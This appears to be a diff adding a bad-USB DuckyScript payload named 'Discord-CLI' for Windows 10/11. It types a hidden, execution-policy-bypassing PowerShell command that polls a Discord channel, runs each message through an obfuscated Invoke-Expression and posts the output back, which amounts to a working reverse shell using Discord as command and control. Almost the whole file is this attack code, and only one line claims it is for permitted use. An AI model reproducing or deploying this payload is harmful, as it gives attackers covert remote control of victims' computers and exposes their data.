@@ -1,0 +1,46 @@
+REM Author:      beigeworm 
+REM Title:       Discord-CLI
+REM Target:      Windows 10/11 
+REM Description: Gain a reverse shell on a target Windows PC using Discord's bot API as a command and control server.
+
+REM **THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE!**
+
+REM Define the Discord bot token and channel ID
+DEFINE #TOKEN your-bot-token-here
+DEFINE #CHANNEL your-channel-id-here
+
+REM Funtion to detect Windows is ready for keystrokes
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+END_EXTENSION
+IF $_OS != WINDOWS
+    LED_R                                                                                                                                       
+    STOP_PAYLOAD 
+END_IF
+
+REM Main bad-USB script
+LED_G
+GUI r
+DELAY 500
+STRINGLN powershell -Ep Bypass -W H
+DELAY 3000
+STRINGLN $t = "#TOKEN";$c = "#CHANNEL";$a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -names Win32Functions -pas;$h=(Get-Process -PID $pid).MainWindowHandle;if($h -ne [System.IntPtr]::Zero){$t::ShowWindowAsync($h,0)}else{$Host.UI.RawUI.WindowTitle='hideme';$n=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'hideme'});$h=$n.MainWindowHandle;$t::ShowWindowAsync($h,0)};function sndmsg{$w.Headers.Add("Content-Type", "application/json");$j = @{"content" = "``````$($b -join "`n")``````"} | ConvertTo-Json;$x = $w.UploadString($u, "POST", $j)}while($true){$u = "https://discord.com/api/v10/channels/$c/messages";$w = New-Object System.Net.WebClient;$w.Headers.Add("Authorization", "Bot $t");$m = $w.DownloadString($u);$r = ($m | ConvertFrom-Json)[0];if(-not $r.author.bot){$a = $r.timestamp;$m = $r.content}if($a -ne $p){$p = $a;$o = ie`x $m;$l = $o -split "`n";$s = 0;$b = @();foreach($z in $l){$y = [System.Text.Encoding]::Unicode.GetByteCount($z);if(($s + $y) -gt 1900){sndmsg;sleep 1;$s = 0;$b = @()}$b += $z;$s += $y}if($b.Count -gt 0){sndmsg}}Sleep 3}
